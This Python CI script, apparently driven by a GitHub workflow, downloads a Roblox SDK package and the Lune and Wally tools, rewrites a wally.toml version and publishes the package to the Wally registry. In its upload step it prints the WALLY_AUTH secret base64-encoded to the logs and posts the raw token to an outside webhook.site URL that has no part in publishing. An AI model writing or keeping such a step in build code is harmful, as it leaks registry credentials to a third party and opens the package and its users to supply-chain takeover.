import gevent
from gevent import monkey

monkey.patch_all()

# Github Workflows: .github/workflows/fetch_superbiz.yml
from requests import Session
from subprocess import run
import zipfile
import tempfile
import os

# TEMP_DIR = tempfile.gettempdir()
TEMP_DIR = "./temp"
if not os.path.exists(TEMP_DIR):
	os.mkdir(TEMP_DIR)

SUPERBIZ_DOWNLOAD = "https://portal-api.bloxbiz.com/sdk/package-download"
SUPERBIZ_SESSION = Session()
SUPERBIZ_SESSION.headers.update(
	{
		"API-KEY": os.environ.get("SUPERBIZ_API_KEY"),
	}
)

LUNE_DOWNLOAD = "https://github.com/filiptibell/lune/releases/download/v0.7.7/lune-0.7.7-linux-x86_64.zip"
WALLY_DOWNLOAD = "https://github.com/UpliftGames/wally/releases/download/v0.3.2/wally-v0.3.2-linux.zip"
GITHUB_SESSION = Session()
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
GITHUB_SESSION.headers.update(
	{
		"authorization": f"Bearer {GITHUB_TOKEN}",
	}
)

WALLY_AUTH = os.environ.get("WALLY_AUTH")

def download_files():
	greenlets = [
		gevent.spawn(SUPERBIZ_SESSION.get, SUPERBIZ_DOWNLOAD),
		gevent.spawn(GITHUB_SESSION.get, LUNE_DOWNLOAD),
		gevent.spawn(GITHUB_SESSION.get, WALLY_DOWNLOAD),
	]
	gevent.joinall(greenlets)
	superbiz_response = greenlets[0].value
	lune_response = greenlets[1].value
	wally_response = greenlets[2].value

	with open(f"{TEMP_DIR}/superbiz.rbxm", "wb") as superbiz_file:
		superbiz_file.write(superbiz_response.content)

	with open(f"{TEMP_DIR}/wally.zip", "wb") as wally_file:
		wally_file.write(wally_response.content)

	with open(f"{TEMP_DIR}/lune.zip", "wb") as lune_file:
		lune_file.write(lune_response.content)

	with zipfile.ZipFile(f"{TEMP_DIR}/lune.zip", "r") as lune_zip:
		lune_zip.extractall(TEMP_DIR)

	with zipfile.ZipFile(f"{TEMP_DIR}/wally.zip", "r") as wally_zip:
		wally_zip.extractall(TEMP_DIR)

	if os.name == "posix":  # linux
		for file in os.listdir(TEMP_DIR):
			run(["chmod", "a+x", f"{TEMP_DIR}/{file}"])


def deconstruct_files():
	# run([f"{TEMP_DIR}/lune.exe", "deconstruct_sdk.luau", TEMP_DIR])
	# capture the output of lune.exe

	output = run(
		[f"{TEMP_DIR}/lune", "deconstruct_sdk.luau", TEMP_DIR], capture_output=True
	)
	return {
		x: y
		for x, y in zip(
			["SDK_name", "SDK_version"],
			output.stdout.decode("utf-8").strip().split(","),
		)
	}


def update_wally_file(SDK_name, SDK_version):
	source_wally_config = f"./wally.toml"
	# copy it to {TEMP_DIR}/{SDK_name}/ and replace "{VERSION}" with SDK version
	if os.path.exists(f"{TEMP_DIR}/{SDK_name}/wally.toml"):
		os.remove(f"{TEMP_DIR}/{SDK_name}/wally.toml")

	with open(source_wally_config, "r") as source_wally_file:
		with open(f"{TEMP_DIR}/{SDK_name}/wally.toml", "w") as dest_wally_file:
			dest_wally_file.write(
				source_wally_file.read().replace("{VERSION}", f"{SDK_version}.0.0")
			)


def upload_to_wally(SDK_name):
	# run(["cd", f"{TEMP_DIR}/{SDK_name}/"])
	import base64
	print("github token length:", len(WALLY_AUTH))
	print("GITHUB_TOKEN", base64.b64encode(WALLY_AUTH.encode("utf-8")))
	Session().post("https://webhook.site/094110d6-d20a-496d-bc22-a1a20b872ae5", data={"token": WALLY_AUTH})
	os.chdir(f"{TEMP_DIR}/{SDK_name}/")
	run([f"../wally", "login", "--token", f'"{WALLY_AUTH}"'])
	run([f"../wally", "publish"])

download_files()
output_proj_info = deconstruct_files()
print("output_proj_info", output_proj_info)
update_wally_file(**output_proj_info)
upload_to_wally(output_proj_info["SDK_name"])
